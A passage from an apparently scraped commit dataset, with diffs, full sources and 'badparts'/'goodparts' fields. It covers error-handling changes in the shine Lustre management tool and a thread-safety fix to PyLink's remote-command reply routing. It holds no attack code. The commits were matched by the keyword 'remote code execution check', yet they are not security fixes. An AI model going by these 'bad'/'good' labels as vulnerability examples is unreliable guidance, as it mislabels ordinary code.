"/lib/Shine/Commands/Umount.py": {"changes": [{"diff": "\n     def ev_stopclient_done(self, node, client):\n         if self.verbose > 1:\n             if client.status_info:\n-                print \"%s: Umount: %s\" % (node, client.status_info)\n+                print \"%s: Umount %s: %s\" % (node, client.fs.fs_name, client.status_info)\n             else:\n                 print \"%s: FS %s succesfully unmounted from %s\" % (node,\n                         client.fs.fs_name, client.mount_path)\n", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Umount.py", "badparts": ["                print \"%s: Umount: %s\" % (node, client.status_info)"], "goodparts": ["                print \"%s: Umount %s: %s\" % (node, client.fs.fs_name, client.status_info)"]}, {"diff": "\n \n             if rc == RC_OK:\n                 if vlevel > 0:\n-                    print \"Unmount successful.\"\n+                        # m_nodes is defined if not self.remote_call and vlevel > 0\n+                    print \"Unmount successful on %s\" % m_nodes\n             elif rc == RC_RUNTIME_ERROR:\n                 for nodes, msg in fs.proxy_errors:\n                     print \"%s: %s\" % (nod", "add": 2, "remove": 1, "filename": "/lib/Shine/Commands/Umount.py", "badparts": ["                    print \"Unmount successful.\""], "goodparts": ["                    print \"Unmount successful on %s\" % m_nodes"]}], "source": "\n \"\"\" Shine `umount' command classes. The umount command aims to stop Lustre filesystem clients. \"\"\" import os from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.Configuration.Exceptions import * from Base.FSClientLiveCommand import FSClientLiveCommand from Base.CommandRCDefs import * from Base.RemoteCallEventHandler import RemoteCallEventHandler from Shine.FSUtils import open_lustrefs import Shine.Lustre.EventHandler from Shine.Lustre.FileSystem import * class GlobalUmountEventHandler(Shine.Lustre.EventHandler.EventHandler): def __init__(self, verbose=1): self.verbose=verbose def ev_stopclient_start(self, node, client): if self.verbose > 1: print \"%s: Unmounting %s on %s...\" %(node, client.fs.fs_name, client.mount_path) def ev_stopclient_done(self, node, client): if self.verbose > 1: if client.status_info: print \"%s: Umount: %s\" %(node, client.status_info) else: print \"%s: FS %s succesfully unmounted from %s\" %(node, client.fs.fs_name, client.mount_path) def ev_stopclient_failed(self, node, client, rc, message): if rc: strerr=os.strerror(rc) else: strerr=message print \"%s: Failed to unmount FS %s from %s: %s\" % \\ (node, client.fs.fs_name, client.mount_path, strerr) if rc: print message class Umount(FSClientLiveCommand): \"\"\" shine umount \"\"\" def __init__(self): FSClientLiveCommand.__init__(self) def get_name(self): return \"umount\" def get_desc(self): return \"Unmount file system clients.\" target_status_rc_map={ \\ MOUNTED: RC_FAILURE, RECOVERING: RC_FAILURE, OFFLINE: RC_OK, TARGET_ERROR: RC_TARGET_ERROR, CLIENT_ERROR: RC_CLIENT_ERROR, RUNTIME_ERROR: RC_RUNTIME_ERROR} def fs_status_to_rc(self, status): return self.target_status_rc_map[status] def execute(self): result=0 self.init_execute() vlevel=self.verbose_support.get_verbose_level() for fsname in self.fs_support.iter_fsname(): eh=self.install_eventhandler(None, GlobalUmountEventHandler(vlevel)) nodes=self.nodes_support.get_nodeset() fs_conf, fs=open_lustrefs(fsname, None, nodes=nodes, indexes=None, event_handler=eh) if nodes and not nodes.issubset(fs_conf.get_client_nodes()): raise CommandException(\"%s are not client nodes of filesystem '%s'\" % \\ (nodes -fs_conf.get_client_nodes(), fsname)) fs.set_debug(self.debug_support.has_debug()) status=fs.umount() rc=self.fs_status_to_rc(status) if rc > result: result=rc if rc==RC_OK: if vlevel > 0: print \"Unmount successful.\" elif rc==RC_RUNTIME_ERROR: for nodes, msg in fs.proxy_errors: print \"%s: %s\" %(nodes, msg) return result ", "sourceWithComments": "# Umount.py -- Unmount file system on clients\n# Copyright (C) 2007, 2008, 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\n\"\"\"\nShine `umount' command classes.\n\nThe umount command aims to stop Lustre filesystem clients.\n\"\"\"\n\nimport os\n\n# Configuration\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \nfrom Shine.Configuration.Exceptions import *\n\n# Command base class\nfrom Base.FSClientLiveCommand import FSClientLiveCommand\nfrom Base.CommandRCDefs import *\n# -R handler\nfrom Base.RemoteCallEventHandler import RemoteCallEventHandler\n\n# Command helper\nfrom Shine.FSUtils import open_lustrefs\n\n# Lustre events\nimport Shine.Lustre.EventHandler\nfrom Shine.Lustre.FileSystem import *\n\n\nclass GlobalUmountEventHandler(Shine.Lustre.EventHandler.EventHandler):\n\n    def __init__(self, verbose=1):\n        self.verbose = verbose\n\n    def ev_stopclient_start(self, node, client):\n        if self.verbose > 1:\n            print \"%s: Unmounting %s on %s ...\" % (node, client.fs.fs_name, client.mount_path)\n\n    def ev_stopclient_done(self, node, client):\n        if self.verbose > 1:\n            if client.status_info:\n                print \"%s: Umount: %s\" % (node, client.status_info)\n            else:\n                print \"%s: FS %s succesfully unmounted from %s\" % (node,\n                        client.fs.fs_name, client.mount_path)\n\n    def ev_stopclient_failed(self, node, client, rc, message):\n        if rc:\n            strerr = os.strerror(rc)\n        else:\n            strerr = message\n        print \"%s: Failed to unmount FS %s from %s: %s\" % \\\n                (node, client.fs.fs_name, client.mount_path, strerr)\n        if rc:\n            print message\n\n\nclass Umount(FSClientLiveCommand):\n    \"\"\"\n    shine umount\n    \"\"\"\n\n    def __init__(self):\n        FSClientLiveCommand.__init__(self)\n\n    def get_name(self):\n        return \"umount\"\n\n    def get_desc(self):\n        return \"Unmount file system clients.\"\n\n    target_status_rc_map = { \\\n            MOUNTED : RC_FAILURE,\n            RECOVERING : RC_FAILURE,\n            OFFLINE : RC_OK,\n            TARGET_ERROR : RC_TARGET_ERROR,\n            CLIENT_ERROR : RC_CLIENT_ERROR,\n            RUNTIME_ERROR : RC_RUNTIME_ERROR }\n\n    def fs_status_to_rc(self, status):\n        return self.target_status_rc_map[status]\n\n    def execute(self):\n        result = 0\n\n        self.init_execute()\n\n        # Get verbose level.\n        vlevel = self.verbose_support.get_verbose_level()\n\n        for fsname in self.fs_support.iter_fsname():\n\n            # Install appropriate event handler.\n            eh = self.install_eventhandler(None,\n                    GlobalUmountEventHandler(vlevel))\n\n            nodes = self.nodes_support.get_nodeset()\n\n            fs_conf, fs = open_lustrefs(fsname, None,\n                    nodes=nodes,\n                    indexes=None,\n                    event_handler=eh)\n\n            if nodes and not nodes.issubset(fs_conf.get_client_nodes()):\n                raise CommandException(\"%s are not client nodes of filesystem '%s'\" % \\\n                        (nodes - fs_conf.get_client_nodes(), fsname))\n\n            fs.set_debug(self.debug_support.has_debug())\n\n            status = fs.umount()\n            rc = self.fs_status_to_rc(status)\n            if rc > result:\n                result = rc\n\n            if rc == RC_OK:\n                if vlevel > 0:\n                    print \"Unmount successful.\"\n            elif rc == RC_RUNTIME_ERROR:\n                for nodes, msg in fs.proxy_errors:\n                    print \"%s: %s\" % (nodes, msg)\n\n        return result\n\n"}, "/lib/Shine/Controller.py": {"changes": [{"diff": "\n             self.print_help(e.message, e.cmd)\n         except CommandException, e:\n             self.print_error(e.message)\n-            return RC_USER_ERROR\n         except ModelFileIOError, e:\n             print \"Error - %s\" % e.message\n         except ModelFileException, e:\n             print \"ModelFile: %s\" % e\n         except ConfigException, e:\n             print \"Configuration: %s\" % e\n-            return RC_RUNTIME_ERROR\n         # file system\n         except FSRemoteError, e:\n             self.print_error(e)\n             return e.rc\n         except NodeSetParseError, e:\n             self.print_error(\"%s\" % e)\n-            return RC_USER_ERROR\n         except RangeSetParseError, e:\n             self.print_error(\"%s\" % e)\n-            return RC_USER_ERROR\n         except KeyError:\n-            print \"Error - Unrecognized action\"\n-            print\n             raise\n         \n-        return 1\n+        return RC_RUNTIME", "add": 1, "remove": 7, "filename": "/lib/Shine/Controller.py", "badparts": ["            return RC_USER_ERROR", "            return RC_RUNTIME_ERROR", "            return RC_USER_ERROR", "            return RC_USER_ERROR", "            print \"Error - Unrecognized action\"", "            print", "        return 1"], "goodparts": ["        return RC_RUNTIME"]}], "source": "\n from Configuration.Globals import Globals from Commands.CommandRegistry import CommandRegistry from Configuration.ModelFile import ModelFileException from Configuration.ModelFile import ModelFileIOError from Configuration.Exceptions import ConfigException from Commands.Exceptions import * from Commands.Base.CommandRCDefs import * from Lustre.FileSystem import FSRemoteError from ClusterShell.Task import * from ClusterShell.NodeSet import * import getopt import logging import re import sys def print_csdebug(task, s): m=re.search(\"(\\w+): SHINE:\\d:(\\w+):\", s) if m: print \"%s<pickle>\" % m.group(0) else: print s class Controller: def __init__(self): self.logger=logging.getLogger(\"shine\") self.cmds=CommandRegistry() task_self().set_info(\"print_debug\", print_csdebug) def usage(self): cmd_maxlen=0 for cmd in self.cmds: if not cmd.is_hidden(): if len(cmd.get_name()) > cmd_maxlen: cmd_maxlen=len(cmd.get_name()) for cmd in self.cmds: if not cmd.is_hidden(): print \" %-*s %s\" %(cmd_maxlen, cmd.get_name(), cmd.get_params_desc()) def print_error(self, errmsg): print >>sys.stderr, \"Error:\", errmsg def print_help(self, msg, cmd): if msg: print msg print print \"Usage: %s %s\" %(cmd.get_name(), cmd.get_params_desc()) print print cmd.get_desc() def run_command(self, cmd_args): try: return self.cmds.execute(cmd_args) except getopt.GetoptError, e: print \"Syntax error: %s\" % e except CommandHelpException, e: self.print_help(e.message, e.cmd) except CommandException, e: self.print_error(e.message) return RC_USER_ERROR except ModelFileIOError, e: print \"Error -%s\" % e.message except ModelFileException, e: print \"ModelFile: %s\" % e except ConfigException, e: print \"Configuration: %s\" % e return RC_RUNTIME_ERROR except FSRemoteError, e: self.print_error(e) return e.rc except NodeSetParseError, e: self.print_error(\"%s\" % e) return RC_USER_ERROR except RangeSetParseError, e: self.print_error(\"%s\" % e) return RC_USER_ERROR except KeyError: print \"Error -Unrecognized action\" print raise return 1 ", "sourceWithComments": "# Controller.py -- Controller class\n# Copyright (C) 2007 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\nfrom Configuration.Globals import Globals\nfrom Commands.CommandRegistry import CommandRegistry\n\nfrom Configuration.ModelFile import ModelFileException\nfrom Configuration.ModelFile import ModelFileIOError\n\nfrom Configuration.Exceptions import ConfigException\nfrom Commands.Exceptions import *\nfrom Commands.Base.CommandRCDefs import *\n\nfrom Lustre.FileSystem import FSRemoteError\n\nfrom ClusterShell.Task import *\nfrom ClusterShell.NodeSet import *\n\nimport getopt\nimport logging\nimport re\nimport sys\n\n\ndef print_csdebug(task, s):\n    m = re.search(\"(\\w+): SHINE:\\d:(\\w+):\", s)\n    if m:\n        print \"%s<pickle>\" % m.group(0)\n    else:\n        print s\n\n\nclass Controller:\n\n    def __init__(self):\n        self.logger = logging.getLogger(\"shine\")\n        #handler = logging.FileHandler(Globals().get_log_file())\n        #formatter = logging.Formatter('%(asctime)s %(levelname)s %(name)s : %(message)s')\n        #handler.setFormatter(formatter)\n        #self.logger.addHandler(handler)\n        #self.logger.setLevel(Globals().get_log_level())\n        self.cmds = CommandRegistry()\n\n        #task_self().set_info(\"debug\", True)\n\n        task_self().set_info(\"print_debug\", print_csdebug)\n\n    def usage(self):\n        cmd_maxlen = 0\n\n        for cmd in self.cmds:\n            if not cmd.is_hidden():\n                if len(cmd.get_name()) > cmd_maxlen:\n                    cmd_maxlen = len(cmd.get_name())\n        for cmd in self.cmds:\n            if not cmd.is_hidden():\n                print \"  %-*s %s\" % (cmd_maxlen, cmd.get_name(),\n                    cmd.get_params_desc())\n\n    def print_error(self, errmsg):\n        print >>sys.stderr, \"Error:\", errmsg\n\n    def print_help(self, msg, cmd):\n        if msg:\n            print msg\n            print\n        print \"Usage: %s %s\" % (cmd.get_name(), cmd.get_params_desc())\n        print\n        print cmd.get_desc()\n\n    def run_command(self, cmd_args):\n\n        #self.logger.info(\"running %s\" % cmd_name)\n\n        try:\n            return self.cmds.execute(cmd_args)\n        except getopt.GetoptError, e:\n            print \"Syntax error: %s\" % e\n        except CommandHelpException, e:\n            self.print_help(e.message, e.cmd)\n        except CommandException, e:\n            self.print_error(e.message)\n            return RC_USER_ERROR\n        except ModelFileIOError, e:\n            print \"Error - %s\" % e.message\n        except ModelFileException, e:\n            print \"ModelFile: %s\" % e\n        except ConfigException, e:\n            print \"Configuration: %s\" % e\n            return RC_RUNTIME_ERROR\n        # file system\n        except FSRemoteError, e:\n            self.print_error(e)\n            return e.rc\n        except NodeSetParseError, e:\n            self.print_error(\"%s\" % e)\n            return RC_USER_ERROR\n        except RangeSetParseError, e:\n            self.print_error(\"%s\" % e)\n            return RC_USER_ERROR\n        except KeyError:\n            print \"Error - Unrecognized action\"\n            print\n            raise\n        \n        return 1\n\n\n"}, "/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py": {"changes": [{"diff": "\n         \"\"\"\n         # Gather nodes by return code\n         for rc, nodes in worker.iter_retcodes():\n+            # some common remote errors:\n             # rc 127 = command not found\n             # rc 126 = found but not executable\n-            if rc >= 126:\n+            # rc 1 = python failure...\n+            if rc != 0:\n                 # Gather these nodes by buffer\n                 for buffer, nodes in worker.iter_buffers(nodes):\n                     # Handle proxy command error which rc ", "add": 3, "remove": 1, "filename": "/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py", "badparts": ["            if rc >= 126:"], "goodparts": ["            if rc != 0:"]}], "source": "\n from Shine.Configuration.Globals import Globals from Shine.Configuration.Configuration import Configuration from ProxyAction import * from ClusterShell.NodeSet import NodeSet class FSProxyAction(ProxyAction): \"\"\" Generic file system command proxy action class. \"\"\" def __init__(self, fs, action, nodes, debug, targets_type=None, targets_indexes=None): ProxyAction.__init__(self) self.fs=fs self.action=action assert isinstance(nodes, NodeSet) self.nodes=nodes self.debug=debug self.targets_type=targets_type self.targets_indexes=targets_indexes if self.fs.debug: print \"FSProxyAction %s on %s\" %(action, nodes) def launch(self): \"\"\" Launch FS proxy command. \"\"\" command=[\"%s\" % self.progpath] command.append(self.action) command.append(\"-f %s\" % self.fs.fs_name) command.append(\"-R\") if self.debug: command.append(\"-d\") if self.targets_type: command.append(\"-t %s\" % self.targets_type) if self.targets_indexes: command.append(\"-i %s\" % self.targets_indexes) self.task.shell(' '.join(command), nodes=self.nodes, handler=self) def ev_read(self, worker): node, buf=worker.last_read() try: event, params=self._shine_msg_unpack(buf) self.fs._handle_shine_event(event, node, **params) except ProxyActionUnpackError, e: pass def ev_close(self, worker): \"\"\" End of proxy command. \"\"\" for rc, nodes in worker.iter_retcodes(): if rc >=126: for buffer, nodes in worker.iter_buffers(nodes): self.fs._handle_shine_proxy_error(nodes, \"Remote action %s failed: %s\" % \\ (self.action, buffer)) self.fs.action_refcnt -=1 if self.fs.action_refcnt==0: worker.task.abort() ", "sourceWithComments": "# FSProxyAction.py -- Lustre generic FS proxy action class\n# Copyright (C) 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\nfrom Shine.Configuration.Globals import Globals\nfrom Shine.Configuration.Configuration import Configuration\n\nfrom ProxyAction import *\n\nfrom ClusterShell.NodeSet import NodeSet\n\n\nclass FSProxyAction(ProxyAction):\n    \"\"\"\n    Generic file system command proxy action class.\n    \"\"\"\n\n    def __init__(self, fs, action, nodes, debug, targets_type=None, targets_indexes=None):\n        ProxyAction.__init__(self)\n        self.fs = fs\n        self.action = action\n        assert isinstance(nodes, NodeSet)\n        self.nodes = nodes\n        self.debug = debug\n        self.targets_type = targets_type\n        self.targets_indexes = targets_indexes\n\n        if self.fs.debug:\n            print \"FSProxyAction %s on %s\" % (action, nodes)\n\n    def launch(self):\n        \"\"\"\n        Launch FS proxy command.\n        \"\"\"\n        command = [\"%s\" % self.progpath]\n        command.append(self.action)\n        command.append(\"-f %s\" % self.fs.fs_name)\n        command.append(\"-R\")\n\n        if self.debug:\n            command.append(\"-d\")\n\n        if self.targets_type:\n            command.append(\"-t %s\" % self.targets_type)\n            if self.targets_indexes:\n                command.append(\"-i %s\" % self.targets_indexes)\n\n        # Schedule cluster command.\n        self.task.shell(' '.join(command), nodes=self.nodes, handler=self)\n\n    def ev_read(self, worker):\n        node, buf = worker.last_read()\n        try:\n            event, params = self._shine_msg_unpack(buf)\n            self.fs._handle_shine_event(event, node, **params)\n        except ProxyActionUnpackError, e:\n            # ignore any non shine messages\n            pass\n\n    def ev_close(self, worker):\n        \"\"\"\n        End of proxy command.\n        \"\"\"\n        # Gather nodes by return code\n        for rc, nodes in worker.iter_retcodes():\n            # rc 127 = command not found\n            # rc 126 = found but not executable\n            if rc >= 126:\n                # Gather these nodes by buffer\n                for buffer, nodes in worker.iter_buffers(nodes):\n                    # Handle proxy command error which rc >= 127 and \n                    self.fs._handle_shine_proxy_error(nodes, \"Remote action %s failed: %s\" % \\\n                            (self.action, buffer))\n\n        self.fs.action_refcnt -= 1\n        if self.fs.action_refcnt == 0:\n            worker.task.abort()\n\n"}}, "msg": "* improved proxy (remote) commands execution error handling, now checking for every error != 0 to catch every possible remote errors\n    * modified return codes when run with -R (remote call) by adding a filter for each command (rc=0 proxy success, rc!=0 proxy failure)\n    * misc. improvements on error handling and return codes handling\n* added mount/umount user messages\n\nSVN commit: r109"}}, "https://github.com/jlu5/PyLink": {"9d9b01839cf3639e59d29c27e70688bdbf44db96": {"url": "https://api.github.com/repos/jlu5/PyLink/commits/9d9b01839cf3639e59d29c27e70688bdbf44db96", "html_url": "https://github.com/jlu5/PyLink/commit/9d9b01839cf3639e59d29c27e70688bdbf44db96", "message": "Split Irc.reply() into _reply() to make 'networks.remote' actually thread-safe\n\nPreviously, the Irc.reply_lock check was in the reply() function itself: replacing it with another function checking for the same lock would delay execution,\nbut then run the wrong reply() code if another module used irc.reply() while 'remote' was executing.", "sha": "9d9b01839cf3639e59d29c27e70688bdbf44db96", "keyword": "remote code execution check", "diff": "diff --git a/classes.py b/classes.py\nindex 774a6eca..a535f647 100644\n--- a/classes.py\n+++ b/classes.py\n@@ -62,7 +62,7 @@ def __init__(self, netname, proto, conf):\n \n         self.connected = threading.Event()\n         self.aborted = threading.Event()\n-        self.reply_lock = threading.Lock()\n+        self.reply_lock = threading.RLock()\n \n         self.pingTimer = None\n \n@@ -559,27 +559,38 @@ def msg(self, target, text, notice=None, source=None, loopback=True):\n             # replies across relay.\n             self.callHooks([source, cmd, {'target': target, 'text': text}])\n \n-    def reply(self, text, notice=None, source=None, private=None, force_privmsg_in_private=False,\n+    def _reply(self, text, notice=None, source=None, private=None, force_privmsg_in_private=False,\n             loopback=True):\n-        \"\"\"Replies to the last caller in the right context (channel or PM).\"\"\"\n+        \"\"\"\n+        Core of the reply() function - replies to the last caller in the right context\n+        (channel or PM).\n+        \"\"\"\n+        if private is None:\n+            # Allow using private replies as the default, if no explicit setting was given.\n+            private = conf.conf['bot'].get(\"prefer_private_replies\")\n+\n+        # Private reply is enabled, or the caller was originally a PM\n+        if private or (self.called_in in self.users):\n+            if not force_privmsg_in_private:\n+                # For private replies, the default is to override the notice=True/False argument,\n+                # and send replies as notices regardless. This is standard behaviour for most\n+                # IRC services, but can be disabled if force_privmsg_in_private is given.\n+                notice = True\n+            target = self.called_by\n+        else:\n+            target = self.called_in\n \n-        with self.reply_lock:\n-            if private is None:\n-                # Allow using private replies as the default, if no explicit setting was given.\n-                private = conf.conf['bot'].get(\"prefer_private_replies\")\n-\n-            # Private reply is enabled, or the caller was originally a PM\n-            if private or (self.called_in in self.users):\n-                if not force_privmsg_in_private:\n-                    # For private replies, the default is to override the notice=True/False argument,\n-                    # and send replies as notices regardless. This is standard behaviour for most\n-                    # IRC services, but can be disabled if force_privmsg_in_private is given.\n-                    notice = True\n-                target = self.called_by\n-            else:\n-                target = self.called_in\n+        self.msg(target, text, notice=notice, source=source, loopback=loopback)\n \n-            self.msg(target, text, notice=notice, source=source, loopback=loopback)\n+    def reply(self, *args, **kwargs):\n+        \"\"\"\n+        Replies to the last caller in the right context (channel or PM).\n+\n+        This function wraps around _reply() and can be monkey-patched in a thread-safe manner\n+        to temporarily redirect plugin output to another target.\n+        \"\"\"\n+        with self.reply_lock:\n+            self._reply(*args, **kwargs)\n \n     def error(self, text, **kwargs):\n         \"\"\"Replies with an error to the last caller in the right context (channel or PM).\"\"\"\ndiff --git a/plugins/networks.py b/plugins/networks.py\nindex c52af0d9..54d9f5bc 100644\n--- a/plugins/networks.py\n+++ b/plugins/networks.py\n@@ -103,19 +103,19 @@ def _remote_reply(placeholder_self, text, **kwargs):\n             del kwargs['source']\n         irc.reply(text, source=irc.pseudoclient.uid, **kwargs)\n \n-    old_reply = remoteirc.reply\n+    old_reply = remoteirc._reply\n \n     with remoteirc.reply_lock:\n         try:  # Remotely call the command (use the PyLink client as a dummy user).\n             # Override the remote irc.reply() to send replies HERE.\n             log.debug('(%s) networks.remote: overriding reply() of IRC object %s', irc.name, netname)\n-            remoteirc.reply = types.MethodType(_remote_reply, remoteirc)\n+            remoteirc._reply = types.MethodType(_remote_reply, remoteirc)\n             world.services[args.service].call_cmd(remoteirc, remoteirc.pseudoclient.uid,\n                                                   ' '.join(args.command))\n         finally:\n             # Restore the original remoteirc.reply()\n             log.debug('(%s) networks.remote: restoring reply() of IRC object %s', irc.name, netname)\n-            remoteirc.reply = old_reply\n+            remoteirc._reply = old_reply\n             # Remove the identification override after we finish.\n             remoteirc.pseudoclient.account = ''\n \n", "files": {"/classes.py": {"changes": [{"diff": "\n \n         self.connected = threading.Event()\n         self.aborted = threading.Event()\n-        self.reply_lock = threading.Lock()\n+        self.reply_lock = threading.RLock()\n \n         self.pingTimer = None\n \n", "add": 1, "remove": 1, "filename": "/classes.py", "badparts": ["        self.reply_lock = threading.Lock()"], "goodparts": ["        self.reply_lock = threading.RLock()"]}, {"diff": "\n             # replies across relay.\n             self.callHooks([source, cmd, {'target': target, 'text': text}])\n \n-    def reply(self, text, notice=None, source=None, private=None, force_privmsg_in_private=False,\n+    def _reply(self, text, notice=None, source=None, private=None, force_privmsg_in_private=False,\n             loopback=True):\n-        \"\"\"Replies to the last caller in the right context (channel or PM).\"\"\"\n+        \"\"\"\n+        Core of the reply() function - replies to the last caller in the right context\n+        (channel or PM).\n+        \"\"\"\n+        if private is None:\n+            # Allow using private replies as the default, if no explicit setting was given.\n+            private = conf.conf['bot'].get(\"prefer_private_replies\")\n+\n+        # Private reply is enabled, or the caller was originally a PM\n+        if private or (self.called_in in self.users):\n+            if not force_privmsg_in_private:\n+                # For private replies, the default is to override the notice=True/False argument,\n+                # and send replies as notices regardless. This is standard behaviour for most\n+                # IRC services, but can be disabled if force_privmsg_in_private is given.\n+                notice = True\n+            target = self.called_by\n+        else:\n+            target = self.called_in\n \n-        with self.reply_lock:\n-            if private is None:\n-                # Allow using private replies as the default, if no explicit setting was given.\n-                private = conf.conf['bot'].get(\"prefer_private_replies\")\n-\n-            # Private reply is enabled, or the caller was originally a PM\n-            if private or (self.called_in in self.users):\n-                if not force_privmsg_in_private:\n-                    # For private replies, the default is to override the notice=True/False argument,\n-                    # and send replies as notices regardless. This is standard behaviour for most\n-                    # IRC services, but can be disabled if force_privmsg_in_private is given.\n-                    notice = True\n-                target = self.called_by\n-            else:\n-                target = self.called_in\n+        self.msg(target, text, notice=notice, source=source, loopback=loopback)\n \n-            self.msg(target, text, notice=notice, source=source, loopback=loopback)\n+    def reply(self, *args, **kwargs):\n+        \"\"\"\n+        Replies to the last caller in the right context (channel or PM).\n+\n+        This function wraps around _reply() and can be monkey-patched in a thread-safe manner\n+        to temporarily redirect plugin output to another target.\n+        \"\"\"\n+        with self.reply_lock:\n+            self._reply(*args, **kwargs)\n \n     def error(self, text, **kwargs):\n         \"\"\"Replies with an error to the last caller in the right context (channel or PM).\"\"\"", "add": 29, "remove": 18, "filename": "/classes.py", "badparts": ["    def reply(self, text, notice=None, source=None, private=None, force_privmsg_in_private=False,", "        \"\"\"Replies to the last caller in the right context (channel or PM).\"\"\"", "        with self.reply_lock:", "            if private is None:", "                private = conf.conf['bot'].get(\"prefer_private_replies\")", "            if private or (self.called_in in self.users):", "                if not force_privmsg_in_private:", "                    notice = True", "                target = self.called_by", "            else:", "                target = self.called_in", "            self.msg(target, text, notice=notice, source=source, loopback=loopback)"], "goodparts": ["    def _reply(self, text, notice=None, source=None, private=None, force_privmsg_in_private=False,", "        \"\"\"", "        Core of the reply() function - replies to the last caller in the right context", "        (channel or PM).", "        \"\"\"", "        if private is None:", "            private = conf.conf['bot'].get(\"prefer_private_replies\")", "        if private or (self.called_in in self.users):", "            if not force_privmsg_in_private:", "                notice = True", "            target = self.called_by", "        else:", "            target = self.called_in", "        self.msg(target, text, notice=notice, source=source, loopback=loopback)", "    def reply(self, *args, **kwargs):", "        \"\"\"", "        Replies to the last caller in the right context (channel or PM).", "        This function wraps around _reply() and can be monkey-patched in a thread-safe manner", "        to temporarily redirect plugin output to another target.", "        \"\"\"", "        with self.reply_lock:", "            self._reply(*args, **kwargs)"]}]}, "/plugins/networks.py": {"changes": [{"diff": "\n             del kwargs['source']\n         irc.reply(text, source=irc.pseudoclient.uid, **kwargs)\n \n-    old_reply = remoteirc.reply\n+    old_reply = remoteirc._reply\n \n     with remoteirc.reply_lock:\n         try:  # Remotely call the command (use the PyLink client as a dummy user).\n             # Override the remote irc.reply() to send replies HERE.\n             log.debug('(%s) networks.remote: overriding reply() of IRC object %s', irc.name, netname)\n-            remoteirc.reply = types.MethodType(_remote_reply, remoteirc)\n+            remoteirc._reply = types.MethodType(_remote_reply, remoteirc)\n             world.services[args.service].call_cmd(remoteirc, remoteirc.pseudoclient.uid,\n                                                   ' '.join(args.command))\n         finally:\n             # Restore the original remoteirc.reply()\n             log.debug('(%s) networks.remote: restoring reply() of IRC object %s', irc.name, netname)\n-            remoteirc.reply = old_reply\n+            remoteirc._reply = old_reply\n             # Remove the identification override after we finish.\n             remoteirc.pseudoclient.account = ''\n \n", "add": 3, "remove": 3, "filename": "/plugins/networks.py", "badparts": ["    old_reply = remoteirc.reply", "            remoteirc.reply = types.MethodType(_remote_reply, remoteirc)", "            remoteirc.reply = old_reply"], "goodparts": ["    old_reply = remoteirc._reply", "            remoteirc._reply = types.MethodType(_remote_reply, remoteirc)", "            remoteirc._reply = old_reply"]}], "source": "\n\"\"\"Networks plugin -allows you to manipulate connections to various configured networks.\"\"\" import importlib import types from pylinkirc import utils, world, conf, classes from pylinkirc.log import log from pylinkirc.coremods import control, permissions @utils.add_cmd def disconnect(irc, source, args): \"\"\"<network> Disconnects the network <network>. When all networks are disconnected, PyLink will automatically exit. To reconnect a network disconnected using this command, use REHASH to reload the networks list.\"\"\" permissions.checkPermissions(irc, source,['networks.disconnect']) try: netname=args[0] network=world.networkobjects[netname] except IndexError: irc.error('Not enough arguments(needs 1: network name(case sensitive)).') return except KeyError: irc.error('No such network \"%s\"(case sensitive).' % netname) return irc.reply(\"Done. If you want to reconnect this network, use the 'rehash' command.\") control.remove_network(network) @utils.add_cmd def autoconnect(irc, source, args): \"\"\"<network> <seconds> Sets the autoconnect time for <network> to <seconds>. You can disable autoconnect for a network by setting <seconds> to a negative value.\"\"\" permissions.checkPermissions(irc, source,['networks.autoconnect']) try: netname=args[0] seconds=float(args[1]) network=world.networkobjects[netname] except IndexError: irc.error('Not enough arguments(needs 2: network name(case sensitive), autoconnect time(in seconds)).') return except KeyError: irc.error('No such network \"%s\"(case sensitive).' % netname) return except ValueError: irc.error('Invalid argument \"%s\" for <seconds>.' % seconds) return network.serverdata['autoconnect']=seconds irc.reply(\"Done.\") remote_parser=utils.IRCParser() remote_parser.add_argument('network') remote_parser.add_argument('--service', type=str, default='pylink') remote_parser.add_argument('command', nargs=utils.IRCParser.REMAINDER) @utils.add_cmd def remote(irc, source, args): \"\"\"<network>[--service <service name>] <command> Runs <command> on the remote network <network>. Plugin responses sent using irc.reply() are supported and returned here, but others are dropped due to protocol limitations.\"\"\" permissions.checkPermissions(irc, source,['networks.remote']) args=remote_parser.parse_args(args) netname=args.network if netname==irc.name: irc.error(\"Cannot remote-send a command to the local network; use a normal command!\") return try: remoteirc=world.networkobjects[netname] except KeyError: irc.error('No such network \"%s\"(case sensitive).' % netname) return if args.service not in world.services: irc.error('Unknown service %r.' % args.service) return remoteirc.called_in=remoteirc.called_by=remoteirc.pseudoclient.uid remoteirc.pseudoclient.account=irc.users[source].account def _remote_reply(placeholder_self, text, **kwargs): \"\"\" reply() rerouter for the 'remote' command. \"\"\" assert 